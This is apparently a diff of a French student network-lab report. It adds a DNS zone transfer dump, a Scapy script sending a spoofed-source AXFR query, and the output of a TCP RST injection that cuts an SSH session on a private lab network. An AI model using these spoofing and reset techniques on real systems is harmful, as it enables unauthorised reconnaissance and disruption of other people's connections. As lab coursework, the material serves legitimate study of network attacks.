@@ -237,7 +237,7 @@ dns.tp3.b2 resolved to 10.3.3.1
 ```
 
 **Capture Wireshark**
-[Echange DNS](dns.pcapng)
+[Echange DNS](wireshark/dns.pcapng)
 
 ### C. HTTP
 **Preuve avec un client**
@@ -255,3 +255,61 @@ root@localhost onelots]# curl web.tp3.b2 | head
 <meta name='viewport" content='width=device-width, initial-scale=1'>
 <title>HTTP Server Test Page powered by: Rocky Linux</title>
 ```
+
+### A. DNS
+**Faire la requête pour get l'enregistrement AXFR**
+
+```
+[onelots@localhost ~]$ dig axfr @dns.tp3.b2 tp3.b2
+
+; <<>> DiG 9.16.23-RH <<>> axfr @dns.tp3.b2 tp3.b2
+; (1 server found)
+;; global options: +cmd
+tp3.b2. 86400 IN SOA dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
+tp3.b2. 86400 IN NS dns.tp3.b2. 
+coolsite.tp3.b2. 86400 IN A 10.3.3.4 
+dns.tp3.b2. 86400 IN A 10.3.3.1 
+meow.tp3.b2. 86400 IN A 10.3.3.6 
+prout.tp3.b2. 86400 IN A 10.3.3.5 
+supersite.tp3.b2. 86400 IN A 10.3.3.3 
+web.tp3.b2. 86400 IN A 10.3.3.2 
+web2.tp3.b2. 86400 IN A 10.3.3.4 
+web3.tp3.b2. 86400 IN A 10.3.3.5 
+web4.tp3.b2. 86400 IN A 10.3.3.6 
+tp3.b2. 86400 IN SOA dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
+```
+
+### B. Flood
+
+**Spoof DNS query**
+```
+from scapy.all import *
+
+answer = sr1(IP(dst="dns.tp3.b2", src="10.3.2.10")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qtype="AXFR", qname="tp3.b2")))
+
+print(answer[DNS].summary())
+```
+
+[DNS spoof query](wireshark/dns_flood.pcapng)
+
+### C. TCP
+**Mettre en place une attaque TCP RST**
+```
+[onelots@localhost]# python3 tcp_reset.py
+ip src >> 10.3.3.1
+ip dst >> 10.3.3.2
+port src >> 56100
+port dst >> 22
+Seq nb >> 2819567537
+Ack nb >> 3424985478
+[ 3029.781295 ] device enp0s3 entered promiscuous mode
+[ 3029.781295 ] device enp0s3 left promiscuous mode
+```
+
+```
+[onelots@localhost ~]$ aclient_loop: send disconnect: Broken pipe
+```
+
+C'est pété = ça a marché
+
+[TCP rst](wireshark/tcp_reset.pcapng)
